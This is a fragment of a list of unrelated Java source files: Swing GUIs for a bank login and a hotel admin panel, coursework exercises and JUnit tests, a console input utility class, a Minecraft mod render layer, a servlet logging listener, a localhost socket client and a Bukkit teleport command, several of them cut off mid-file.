255));\n\t\tbtnNewButton.setBackground(new Color(0, 0, 0));\n\t\tbtnNewButton.setFont(new Font(\"Arial Black\", Font.BOLD | Font.ITALIC, 15));\n\t\tbtnNewButton.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\tframe.dispose();\n\t\t\t\tLogPersonel personel = new LogPersonel(frame);\n\t\t\t}\n\t\t});\n\t\tframe.getContentPane().setLayout(null);\n\t\tframe.getContentPane().add(btnNewButton);\n\t\t\n\t\tJButton btnMteri = new JButton(\"M\u00fc\u015fteri\");\n\t\tbtnMteri.setBounds(10, 86, 200, 100);\n\t\tbtnMteri.setForeground(new Color(255, 255, 255));\n\t\tbtnMteri.setBackground(new Color(0, 0, 0));\n\t\tbtnMteri.setFont(new Font(\"Arial Black\", Font.BOLD | Font.ITALIC, 15));\n\t\t\n\t\tbtnMteri.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\tframe.dispose();\n\t\t\t\tLogM\u00fcsteri m\u00fcsteri = new LogM\u00fcsteri(frame);\n\t\t\t\t\n\t\t\t}\n\t\t});\n\t\tframe.getContentPane().add(btnMteri);\n\t\t\n\t\tJButton btnYnetici = new JButton(\"Y\u00f6netici\");\n\t\tbtnYnetici.setBounds(459, 86, 200, 100);\n\t\tbtnYnetici.setForeground(new Color(255, 255, 255));\n\t\tbtnYnetici.setBackground(new Color(0, 0, 0));\n\t\tbtnYnetici.setFont(new Font(\"Arial Black\", Font.BOLD | Font.ITALIC, 15));\n\t\tframe.getContentPane().add(btnYnetici);\n\t\t\n\t\tbtnYnetici.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\tframe.dispose();\n\t\t\t\tLogY\u00f6netici y\u00f6netici = new LogY\u00f6netici(frame);\n\t\t\t}\n\t\t});\n\t\t\n\t\tJLabel lblNewLabel = new JLabel(\"CANER BANK HO\u015e GELD\u0130N\u0130Z L\u00dcTFEN G\u0130R\u0130\u015e T\u00dcR\u00dc SE\u00c7\u0130N\u0130Z\");\n\t\tlblNewLabel.setBounds(10, 11, 649, 41);\n\t\tlblNewLabel.setBackground(new Color(255, 255, 255));\n\t\tlblNewLabel.setForeground(new Color(0, 0, 0));\n\t\tlblNewLabel.setFont(new Font(\"Arial Black\", Font.BOLD, 15));\n\t\tlblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);\n\t\tframe.getContentPane().add(lblNewLabel);\n\t\t\n\t\tJLabel mesag = new JLabel(\"B\u0130Z\u0130 TERC\u0130H ETT\u0130\u011e\u0130N\u0130Z \u0130\u00c7\u0130N TE\u015eEKK\u00dcRLER, L\u00dcTFEN S\u0130ZE UYGUN OLAN G\u0130R\u0130\u015e T\u00dcR\u00dcN\u00dc SE\u00c7\u0130N\u0130Z\");\n\t\tmesag.setBounds(10, 197, 649, 114);\n\t\tmesag.setFont(new Font(\"Times New Roman\", Font.BOLD | Font.ITALIC, 12));\n\t\tmesag.setForeground(Color.BLACK);\n\t\tmesag.setHorizontalAlignment(SwingConstants.CENTER);\n\t\tframe.getContentPane().add(mesag);\n\t\t\n\t\t//frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\t}\n}\n",
    "/* \nProblem Statement:\nYour are given a positive integer k.\nYour task is to find the geometric sum i.e. 1 + 1/2 + 1/4 + 1/8 + _______ + 1/(2^k)\nNote: Use recursion to implement your solution.\nYour task is to complete function geometricSum with following parameters passed:\ninteger k: k is a positive integer defines the limit up to which you have to find the geometric sum.\nFunction returns:\nfloat : Return the geometric sum i.e. as real number.\n\nConstraints to be followed:\n0 <= k <= 100\nSample test case 1:\nInput:\n3 // value of k\nOutput:\n1.875000 // geometric sum up to 5 decimal places\nSample test case 2:\nInput:\n4\nOutput:\n1.937500\nBrief editorial: in test case 1 geometric sum will be calculated as: 1+ 1/(2^1) + 1/(2^2) + 1/(2^3) = 1.875\n*/ \n\nimport java.util.*;\npublic class Main\n{\n    public static double findGeometricSum(int k){\n\t\tif(k==0)\n\t\t{\n\t\t\treturn 1;\n\t\t}\n\t\treturn (1/(Math.pow(2, k)))+findGeometricSum(k-1); \n\n\t}\n\tpublic static void main(String[] args) {\n\t\tScanner sc = new Scanner(System.in);\n\t\tint k=sc.nextInt();\n\t\tSystem.out.printf(\"%.5f\",findGeometricSum(k));\n\t}\n}\n",
    "package com.pismo.transactionroutine.domain.validator.impl;\n\nimport com.pismo.transactionroutine.exception.FailedValidationException;\nimport java.math.BigDecimal;\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.mockito.InjectMocks;\nimport org.mockito.junit.jupiter.MockitoExtension;\n\n@ExtendWith(MockitoExtension.class)\nclass PositiveAmountTransactionTypeValidationUnitTest {\n\n    @InjectMocks\n    private PositiveAmountTransactionTypeValidation positiveAmountTransactionTypeValidation;\n\n    @Test\n    void validate_shouldThrowException_whenAmountIsNegativeAndDescriptionIsCreditType() {\n\n        Assertions.assertThrows(FailedValidationException.class,\n                () -> positiveAmountTransactionTypeValidation.validate(\"Credit Voucher\", new BigDecimal(\"-23.5\")));\n\n    }\n\n    @Test\n    void validate_shouldNotThrowException_whenAmountIsNegativeAndDescriptionIsCreditType() {\n\n        Assertions.assertDoesNotThrow(\n                () -> positiveAmountTransactionTypeValidation.validate(\"Credit Voucher\", new BigDecimal(\"23.5\")));\n\n    }\n}\n",
    "package com.campusdual.util;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.text.DecimalFormat;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class Utils {\n\n    private Utils(){}\n\n    public static final Random random = new Random();\n    public static final DecimalFormat dF = new DecimalFormat(\"#.##\");\n\n    /**\n     * Method to initialize input data.\n     * @return input Buffered string data.\n     */\n    public static String init() {\n        String buffer = \"\";\n        InputStreamReader stream = new InputStreamReader(System.in);\n        BufferedReader reader = new BufferedReader(stream);\n        try {\n            buffer = reader.readLine();\n        } catch (Exception e) {\n            System.out.append(\"Dato no v\u00e1lido.\");\n        }\n        return buffer;\n    }\n\n    /**\n     * Method to get an integer from input data.\n     * @return integer entered by the user.\n     */\n    public static int integer() {\n        return Utils.integer(null);\n    }\n\n    /**\n     * Method to get an integer from input data with a custom message.\n     * @param message custom message for the user.\n     * @return integer entered by the user.\n     */\n    public static int integer(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n\n        try{\n            return Integer.parseInt(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero entero.\");\n            return integer(message);\n        }\n    }\n\n\n    /**\n     * Method to get a real number from input data.\n     * @return real number entered by the user.\n     */\n    public static double real() {\n        return Utils.real(null);\n    }\n\n    /**\n     * Method to get a real number from input data with a custom message.\n     * @param message custom message for the user.\n     * @return real number entered by the user.\n     */\n    public static double real(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        try{\n\n            return Double.parseDouble(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero real.\");\n            return real(message);\n        }\n    }\n\n    /**\n     * Method to get a text string from input data.\n     * @return text string entered by the user.\n     */\n    public static String string() {\n        return Utils.string(null);\n    }\n\n\n    /**\n     * Method to get a text string from input data with a custom message.\n     * @param message custom message for the user.\n     * @return text string entered by the user.\n     */\n    public static String string(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        return Utils.init();\n    }\n\n    /**\n     * Method to get a character from input data.\n     * @return character entered by the user.\n     */\n    public static char character() {\n        return Utils.character(null);\n    }\n\n    /**\n     * Method to get a character from input data with a custom message.\n     * @param message custom message for the user.\n     * @return character entered by the user.\n     */\n    public static char character(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        String valor = Utils.init();\n        return valor.charAt(0);\n    }\n\n    /**\n     * Formats the {@link Double} value passed as a parameter with the pattern #.##\n     *\n     * @param d\n     *            the value to be transformed\n     * @return The formatted double\n     */\n    public static String formatLocalNumber(double d) {\n        return dF.format(d);\n    }\n\n    /**\n     * Retrieves a random number selected from the values passed as parameters.\n     *\n     * @param min\n     *            The lower limit of the range\n     * @param max\n     *            The upper limit of the range\n     * @return A random number within the selected range.\n     */\n    public static int getRandomNumberInRange(int min, int max) {\n        max++;\n        return random.nextInt(max - min) + min;\n    }\n\n    /**\n     * Displays a list with indices and allows it to show a waiting message.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     */\n    public static <T> void showFromList(List<T> list, boolean wait) {\n        Utils.showFromList(list, wait, null);\n    }\n\n    /**\n     * Displays a list with indices, allows showing a waiting message, and excludes\n     * the elements from the first list that are present in the second list.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     * @param excludeElements\n     *      ",
    "package com.aetherteam.protectyourmoa.client.renderer.entity.layers;\n\nimport com.aetherteam.aether.client.renderer.entity.model.MoaModel;\nimport com.aetherteam.aether.entity.passive.Moa;\nimport com.aetherteam.protectyourmoa.capability.armor.MoaArmor;\nimport com.aetherteam.protectyourmoa.client.renderer.entity.ProtectModelLayers;\nimport com.aetherteam.protectyourmoa.item.combat.MoaArmorItem;\nimport com.mojang.blaze3d.vertex.PoseStack;\nimport com.mojang.blaze3d.vertex.VertexConsumer;\nimport net.minecraft.client.model.geom.EntityModelSet;\nimport net.minecraft.client.renderer.MultiBufferSource;\nimport net.minecraft.client.renderer.RenderType;\nimport net.minecraft.client.renderer.entity.RenderLayerParent;\nimport net.minecraft.client.renderer.entity.layers.RenderLayer;\nimport net.minecraft.client.renderer.texture.OverlayTexture;\nimport net.minecraft.world.item.ItemStack;\n\npublic class MoaArmorLayer extends RenderLayer<Moa, MoaModel> {\n    private final MoaModel model;\n\n    public MoaArmorLayer(RenderLayerParent<Moa, MoaModel> renderer, EntityModelSet modelSet) {\n        super(renderer);\n        this.model = new MoaModel(modelSet.bakeLayer(ProtectModelLayers.MOA_ARMOR));\n    }\n\n    @Override\n    public void render(PoseStack poseStack, MultiBufferSource buffer, int packedLight, Moa moa, float limbSwing, float limbSwingAmount, float partialTick, float ageInTicks, float netHeadYaw, float headPitch) {\n        MoaArmor.get(moa).ifPresent(moaArmor -> {\n            ItemStack itemStack = moaArmor.getArmor();\n            if (itemStack != null && !itemStack.isEmpty() && itemStack.getItem() instanceof MoaArmorItem moaArmorItem) {\n                this.getParentModel().copyPropertiesTo(this.model);\n                this.model.prepareMobModel(moa, limbSwing, limbSwingAmount, partialTick);\n                this.model.setupAnim(moa, limbSwing, limbSwingAmount, ageInTicks, netHeadYaw, headPitch);\n                float f = 1.0F;\n                float f1 = 1.0F;\n                float f2 = 1.0F;\n//                if (horsearmoritem instanceof DyeableHorseArmorItem) {\n//                    int i = ((DyeableHorseArmorItem)horsearmoritem).getColor(itemstack);\n//                    f = (float)(i >> 16 & 255) / 255.0F;\n//                    f1 = (float)(i >> 8 & 255) / 255.0F;\n//                    f2 = (float)(i & 255) / 255.0F;\n//                } else {\n//                    f = 1.0F;\n//                    f1 = 1.0F;\n//                    f2 = 1.0F;\n//                }\n\n                VertexConsumer vertexconsumer = buffer.getBuffer(RenderType.entityCutoutNoCull(moaArmorItem.getTexture()));\n                this.model.renderToBuffer(poseStack, vertexconsumer, packedLight, OverlayTexture.NO_OVERLAY, f, f1, f2, 1.0F);\n            }\n        });\n    }\n}\n\n",
    "package com.campusdual.util;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.text.DecimalFormat;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class Utils {\n\n    private Utils(){}\n\n    public static final Random random = new Random();\n    public static final DecimalFormat dF = new DecimalFormat(\"#.##\");\n\n    /**\n     * Method to initialize input data.\n     * @return input Buffered string data.\n     */\n    public static String init() {\n        String buffer = \"\";\n        InputStreamReader stream = new InputStreamReader(System.in);\n        BufferedReader reader = new BufferedReader(stream);\n        try {\n            buffer = reader.readLine();\n        } catch (Exception e) {\n            System.out.append(\"Dato no v\u00e1lido.\");\n        }\n        return buffer;\n    }\n\n    /**\n     * Method to get an integer from input data.\n     * @return integer entered by the user.\n     */\n    public static int integer() {\n        return Utils.integer(null);\n    }\n\n    /**\n     * Method to get an integer from input data with a custom message.\n     * @param message custom message for the user.\n     * @return integer entered by the user.\n     */\n    public static int integer(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n\n        try{\n            return Integer.parseInt(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero entero.\");\n            return integer(message);\n        }\n    }\n\n\n    /**\n     * Method to get a real number from input data.\n     * @return real number entered by the user.\n     */\n    public static double real() {\n        return Utils.real(null);\n    }\n\n    /**\n     * Method to get a real number from input data with a custom message.\n     * @param message custom message for the user.\n     * @return real number entered by the user.\n     */\n    public static double real(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        try{\n\n            return Double.parseDouble(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero real.\");\n            return real(message);\n        }\n    }\n\n    /**\n     * Method to get a text string from input data.\n     * @return text string entered by the user.\n     */\n    public static String string() {\n        return Utils.string(null);\n    }\n\n\n    /**\n     * Method to get a text string from input data with a custom message.\n     * @param message custom message for the user.\n     * @return text string entered by the user.\n     */\n    public static String string(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        return Utils.init();\n    }\n\n    /**\n     * Method to get a character from input data.\n     * @return character entered by the user.\n     */\n    public static char character() {\n        return Utils.character(null);\n    }\n\n    /**\n     * Method to get a character from input data with a custom message.\n     * @param message custom message for the user.\n     * @return character entered by the user.\n     */\n    public static char character(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        String valor = Utils.init();\n        return valor.charAt(0);\n    }\n\n    /**\n     * Formats the {@link Double} value passed as a parameter with the pattern #.##\n     *\n     * @param d\n     *            the value to be transformed\n     * @return The formatted double\n     */\n    public static String formatLocalNumber(double d) {\n        return dF.format(d);\n    }\n\n    /**\n     * Retrieves a random number selected from the values passed as parameters.\n     *\n     * @param min\n     *            The lower limit of the range\n     * @param max\n     *            The upper limit of the range\n     * @return A random number within the selected range.\n     */\n    public static int getRandomNumberInRange(int min, int max) {\n        max++;\n        return random.nextInt(max - min) + min;\n    }\n\n    /**\n     * Displays a list with indices and allows it to show a waiting message.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     */\n    public static <T> void showFromList(List<T> list, boolean wait) {\n        Utils.showFromList(list, wait, null);\n    }\n\n    /**\n     * Displays a list with indices, allows showing a waiting message, and excludes\n     * the elements from the first list that are present in the second list.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     * @param excludeElements\n     *      ",
    "package UI;\n\nimport DB.DBSettings;\n\nimport javax.swing.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class Yonetici extends JFrame{\n    private JPanel adminpanel;\n    private JButton odaListeleButton;\n    private JButton odaG\u00fcncelleButton;\n    private JButton \u00e7al\u0131\u015fanEkleButton;\n    private JButton m\u00fc\u015fteriListeleButton;\n    private JButton etkinlikG\u00fcncelleButton;\n    private JButton \u00e7al\u0131\u015fanG\u00fcncelleButton;\n    private JButton \u00e7al\u0131\u015fanSilButton;\n    private JButton organizasyonG\u00fcncelleButton;\n    private JButton giriseDonButton;\n    private JButton marketG\u00fcncelleButton;\n    private JButton \u00e7al\u0131\u015fanListeleButton;\n    private JButton marketListeleButton;\n    private JButton \u00fcr\u00fcnEkleButton;\n    private JButton m\u00fc\u015fteriSilButton;\n    private JButton m\u00fc\u015fteriEkleButton;\n    private JButton odaEkleButton;\n    private JButton odaSilButton;\n    private JButton \u00fcr\u00fcnSilButton;\n    private JButton m\u00fc\u015fteriG\u00fcncelleButton;\n    private JButton etkinlikEkleButton;\n    private JButton organizasyonEkleButton;\n    private JButton etkinlikSilButton;\n    private JButton organizasyonSilButton;\n    private JButton etkinlikListeleButton;\n    private JButton organizasyonListeleButton;\n    private JButton rezervasyonEkleButton;\n    private JButton rezervasyonSilButton;\n    private JButton rezervasyonListeleButton;\n    private JButton rezervasyonG\u00fcncelleButton;\n\n    public Yonetici(){\n        this.setTitle(\"Yonetici Panel\");\n        this.setContentPane(adminpanel);\n        this.setVisible(true);\n        this.setDefaultCloseOperation(EXIT_ON_CLOSE);\n        this.setLocationRelativeTo(null);\n        this.pack();\n\n        giriseDonButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                dispose();\n                new Giris();\n            }\n        });\n        \u00fcr\u00fcnEkleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new \u00dcr\u00fcnEkle();\n            }\n        });\n        \u00fcr\u00fcnSilButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new \u00dcr\u00fcnSil();\n            }\n        });\n        marketListeleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new \u00dcr\u00fcnListele();\n            }\n        });\n        odaEkleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new OdaEkle();\n            }\n        });\n        \u00e7al\u0131\u015fanListeleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new CalisanListele();\n            }\n        });\n        \u00e7al\u0131\u015fanEkleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new CalisanEkle();\n            }\n        });\n        \u00e7al\u0131\u015fanSilButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new CalisanSil();\n            }\n        });\n        etkinlikEkleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new EtkinlikEkle();\n            }\n        });\n        etkinlikSilButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new EtkinlikSil();\n            }\n        });\n        etkinlikListeleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new EtkinlikListele();\n            }\n        });\n        marketG\u00fcncelleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new \u00dcr\u00fcnG\u00fcncelle();\n            }\n        });\n        \u00e7al\u0131\u015fanG\u00fcncelleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new CalisanGuncelle();\n            }\n        });\n        etkinlikG\u00fcncelleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new EtkinlikG\u00fcncelle();\n            }\n        });\n        odaListeleButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new OdaListele();\n            }\n        });\n        odaSilButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                new OdaSil();\n            }\n        });\n        organizasyonEk",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise19Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n    @Test\n    @DisplayName(\"Checks if the created one-dimensional array contains the natural numbers from 1 to 5.\")\n    void testCreateAndPopulateUnidimensionalArray() {\n        int[] unidimensionalArray = Exercise19.createAndPopulateUnidimensionalArray(5);\n        assertEquals(1, unidimensionalArray[0]);\n        assertEquals(2, unidimensionalArray[1]);\n        assertEquals(3, unidimensionalArray[2]);\n        assertEquals(4, unidimensionalArray[3]);\n        assertEquals(5, unidimensionalArray[4]);\n    }\n\n    @Test\n    @DisplayName(\"Checks if the created two-dimensional array contains the natural numbers from 1 to 9.\")\n    void testCreateAndPopulateBidimensionalArray() {\n        int[][] bidimensionalArray = Exercise19.createAndPopulateBidimensionalArray(3, 3);\n        assertEquals(1, bidimensionalArray[0][0]);\n        assertEquals(2, bidimensionalArray[0][1]);\n        assertEquals(3, bidimensionalArray[0][2]);\n        assertEquals(4, bidimensionalArray[1][0]);\n        assertEquals(5, bidimensionalArray[1][1]);\n        assertEquals(6, bidimensionalArray[1][2]);\n        assertEquals(7, bidimensionalArray[2][0]);\n        assertEquals(8, bidimensionalArray[2][1]);\n        assertEquals(9, bidimensionalArray[2][2]);\n    }\n\n    @Test\n    @DisplayName(\"Checks if the created three-dimensional array contains the natural numbers from 1 to 9.\")\n    void testCreateAndPopulateTridimensionalArray() {\n        int[][][] tridimensionalArray = Exercise19.createAndPopulateTridimensionalArray(2, 2, 2);\n        assertEquals(1, tridimensionalArray[0][0][0]);\n        assertEquals(2, tridimensionalArray[0][0][1]);\n        assertEquals(3, tridimensionalArray[0][1][0]);\n        assertEquals(4, tridimensionalArray[0][1][1]);\n        assertEquals(5, tridimensionalArray[1][0][0]);\n        assertEquals(6, tridimensionalArray[1][0][1]);\n        assertEquals(7, tridimensionalArray[1][1][0]);\n        assertEquals(8, tridimensionalArray[1][1][1]);\n    }\n\n    @Test\n    @DisplayName(\"Check that the String resulting from a one-dimensional array of 5 elements contains the first 5 natural numbers, each separated by 1 space.\")\n    void testGetUnidimensionalString() {\n        int[] unidimensionalArray = Exercise19.createAndPopulateUnidimensionalArray(5);\n        String unidimensionalString = Exercise19.getUnidimensionalString(unidimensionalArray);\n        assertEquals(\"1 2 3 4 5\", unidimensionalString);\n    }\n\n    @Test\n    @DisplayName(\"Check that the String resulting from a two-dimensional array of 3 elements contains the first 9 natural numbers, each separated by 1 space and every 3 elements by a line break.Verify that the String resulting from a two-dimensional array of 3 elements contains the first 9 natural numbers, each separated by 1 space and every 3 elements by a new line.\")\n    void testGetBidimensionalString() {\n        int[][] bidimensionalArray = Exercise19.createAndPopulateBidimensionalArray(3, 3);\n        String bidimensionalString = Exercise19.getBidimensionalString(bidimensionalArray);\n        assertEquals(\"1 2 3\\n4 5 6\\n7 8 9\", bidimensionalString);\n    }\n\n    @Test\n    @DisplayName(\"Check that a three-dimensional array flattens correctly. Flattening a three-dimensional matrix means to sum the result of the same position in all layers.\")\n    void testFlattenTridimensionalArray() {\n        int[][][] tridimensionalArray = Exercise19.createAndPopulateTridimensionalArray(3, 3, 3);\n        int[][] flatMatrix = Exercise19.flatTridimensionalArray(tridimensionalArray);\n        assertEquals(30, flatMatrix[0][0]);\n        assertEquals(33, flatMatrix[0][1]);\n        assertEquals(36, flatMatrix[0][2]);\n        assertEquals(39, flatMatrix[1][0]);\n        assertEquals(42, flatMatrix[1][1]);\n        assertEquals(45, flatMatrix[1][2]);\n        assertEquals(48, flatMatrix[2][0]);\n        assertEquals(51, flatMatrix[2][1]);\n        assertEquals(54, flatMatrix[2][2]);\n    }\n}",
    "/**\n * (C) Copyright 2021 Araf Karsh Hamid \n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *   http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage io.fusion.air.microservice.server.filters;\n\nimport java.util.UUID;\n\nimport jakarta.servlet.ServletRequestEvent;\nimport jakarta.servlet.ServletRequestListener;\nimport jakarta.servlet.annotation.WebListener;\nimport jakarta.servlet.http.HttpServletRequest;\n\nimport io.fusion.air.microservice.server.config.ServiceConfiguration;\nimport org.slf4j.Logger;\nimport org.slf4j.MDC;\nimport org.springframework.beans.factory.annotation.Autowired;\n\nimport static java.lang.invoke.MethodHandles.lookup;\nimport static org.slf4j.LoggerFactory.getLogger;\n\n/**\n * A ServletRequest is defined as coming into scope of a web application \n * when it is about to enter the first servlet or filter of the web \n * application, and as going out of scope as it exits the last servlet or \n * the first filter in the chain\n * \n * Source: https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequestListener.html\n *\n * MDC = Mapped Diagnostic Contexts\n * A Mapped Diagnostic Context, or MDC in short, is an instrument for distinguishing interleaved\n * log output from different sources. Log output is typically interleaved when a server handles\n * multiple clients near-simultaneously.\n *\n * MDC is used to stamp each request. It is done by putting the contextual information about the\n * request into the MDC\n *\n * MDC.put(\"sessionId\", \"abcd\");\n * MDC.put(\"userId\", \"1234\");\n *\n * Printing the values from MDC in the logs\n *\n * <appender name=\"CONSOLE\" class=\"ch.qos.logback.core.ConsoleAppender\">\n *   <layout>\n *     <Pattern>%d{DATE} %p %X{sessionId} %X{userId} %c - %m%n</Pattern>\n *   </layout>\n * </appender>\n * \n * @author arafkarsh\n *\n */\n@WebListener\npublic class ServiceRequestFilter implements ServletRequestListener {\n\n\t// Set Logger -> Lookup will automatically determine the class name.\n\tprivate static final Logger log = getLogger(lookup().lookupClass());\n\n\t@Autowired\n\tprivate ServiceConfiguration serviceConfig;\n\n\t/**\n\t * Add the following values into the log for the request\n\t * Unique Request ID\n\t * Client IP Address\n\t * Client Port Number\n\t *\n\t * @param sre\n\t */\n\t@Override\n\tpublic void requestInitialized(ServletRequestEvent sre) {\n\t\tHttpServletRequest httpRequest = (HttpServletRequest) sre.getServletRequest();\n\t\tString reqId =UUID.randomUUID().toString();\n\t\tMDC.put(\"ReqId\", reqId);\n\t\tMDC.put(\"IP\", httpRequest.getRemoteHost());\n\t\tMDC.put(\"Port\", String.valueOf(httpRequest.getRemotePort()));\n\t\tMDC.put(\"URI\", httpRequest.getRequestURI());\n\t\tMDC.put(\"Protocol\", httpRequest.getMethod());\n\t\tMDC.put(\"user\", \"john.doe\");\n\n\t\tString name= (serviceConfig != null) ? serviceConfig.getServiceName(): \"NotDefined\";\n\t\tMDC.put(\"Service\", name);\n\t}\n\n\t/**\n\t * Clear all the values When Request is done.\n\t * @param sre\n\t */\n\t@Override\n\tpublic void requestDestroyed(ServletRequestEvent sre) {\n\t\tMDC.clear();\n\t}\n}",
    "package MultiThreaded;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class Client {\n\n    public Runnable getRunnable() throws UnknownHostException, IOException {\n        return new Runnable() {\n            @Override\n            public void run() {\n                int port = 8010;\n                try {\n                    InetAddress address = InetAddress.getByName(\"localhost\");\n                    Socket socket = new Socket(address, port);\n                    try (\n                            PrintWriter toSocket = new PrintWriter(socket.getOutputStream(), true);\n                            BufferedReader fromSocket = new BufferedReader(new InputStreamReader(socket.getInputStream()))\n                    ) {\n                        toSocket.println(\"Hello from Client \" + socket.getLocalSocketAddress());\n                        String line = fromSocket.readLine();\n                        System.out.println(\"Response from Server \" + line);\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                    // The socket will be closed automatically when leaving the try-with-resources block\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n\n            }\n        };\n    }\n\n    public static void main(String[] args){\n        Client client = new Client();\n        for(int i=0; i<100; i++){\n            try{\n                Thread thread = new Thread(client.getRunnable());\n                thread.start();\n            }catch(Exception ex){\n                return;\n            }\n        }\n        return;\n    }\n}",
    "package org.randomtp.rtp.command;\r\n\r\nimport org.bukkit.*;\r\nimport org.bukkit.command.Command;\r\nimport org.bukkit.command.CommandSender;\r\nimport org.bukkit.entity.Player;\r\nimport org.jetbrains.annotations.NotNull;\r\n\r\nimport java.util.List;\r\nimport java.util.Random;\r\n\r\npublic class RandomTeleportCommand extends Command{\r\n\r\n    public RandomTeleportCommand(@NotNull String name, @NotNull String description, @NotNull String usageMessage, @NotNull List<String> aliases) {\r\n        super(name, description, usageMessage, aliases);\r\n    }\r\n\r\n    @Override\r\n    public boolean execute(@NotNull CommandSender commandSender, @NotNull String s, @NotNull String[] strings) {\r\n        if (commandSender instanceof Player) {\r\n            Player player = (Player) commandSender;\r\n            player.sendTitle(\"\u00a77Location search\", null);\r\n            \r\n            Random random = new Random();\r\n            int x = random.nextInt(1000) - 500;\r\n            int y = 60;\r\n            int z = random.nextInt(1000) - 500;\r\n\r\n            World world = player.getWorld();\r\n            Chunk chunk = world.getChunkAt(x, z);\r\n            if (chunk.load()) {\r\n                Location targetLocation = new Location(world, x, y, z);\r\n                while (targetLocation.getBlock().getType() != Material.AIR) {\r\n                    targetLocation.setY(targetLocation.getY() + 1);\r\n                }\r\n\r\n                world.loadChunk(chunk);\r\n                player.sendTitle(\"\u00a7eLocation found\", null);\r\n                player.teleport(targetLocation);\r\n                return true;\r\n            }\r\n            player.sendMessage(\"\u00a7cError! Location was not found\");\r\n            return true;\r\n        }\r\n        commandSender.sendMessage(\"Use in game\");\r\n        return true;\r\n    }\r\n}",
